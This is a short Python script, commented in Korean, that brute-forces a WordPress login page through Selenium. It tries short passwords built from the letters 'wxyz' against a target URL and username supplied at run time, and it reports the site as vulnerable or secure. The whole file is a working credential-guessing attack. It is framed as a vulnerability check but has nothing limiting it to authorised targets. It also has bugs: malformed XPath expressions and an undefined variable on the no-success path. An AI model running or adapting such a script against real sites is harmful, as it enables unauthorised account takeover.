from itertools import product
from selenium import webdriver
from urllib.error import *
from urllib.request import *
import sys

#brutefore 공격에 사용할 문자
words ='wxyz'

#xpath 모음
xpath_id = '//[@id="user_login"]'
xpath_pw = '//[@id="user_pass"]'
xpath_click = '//*[@id="wp-submit"]'

text = input('로그인 주소를 입력하세요(www.test.com) : ')
id = input('ID : ')

url = 'http://' + text

for passwd_length in range(1,3): #자릿수 지정 (1~2)
    admin_passwd = product(words, repeat=passwd_length) #words 안의 문자를 하나씩 끊어서 경우의 수 만들기
    
    #bruteforce 공격 실행
    for passwd_tmp in admin_passwd:
        passwd = ''
        passwd = ''.join(passwd_tmp)

        #크롬 브라우저 실행 -> url 열기
        driver = webdriver.Chrome("C:/chromedriver.exe")
        driver.get(url)

        #지정한 xpath에 값 넣고 실행하기
        driver.find_element('xpath',xpath_id).send_keys(id)
        driver.find_element('xpath',xpath_pw).send_keys(passwd)
        driver.find_element('xpath',xpath_click).click()

        try:
            res = urlopen(driver.current_url)
            html = driver.page_source

        except HTTPError as e: # HTTP 에러발생 -> 무시하고 진행
            continue
        else: #로그인 성공시 뜨는 페이지 특징으로 brueteforce 공격 성공 여부 확인
            if "안녕하세요" in html:
                print('Brute Force : 취약')
                error = 1
                sys.exit()
            else:
                continue

if error != 1:
    print('Brute Force : 양호')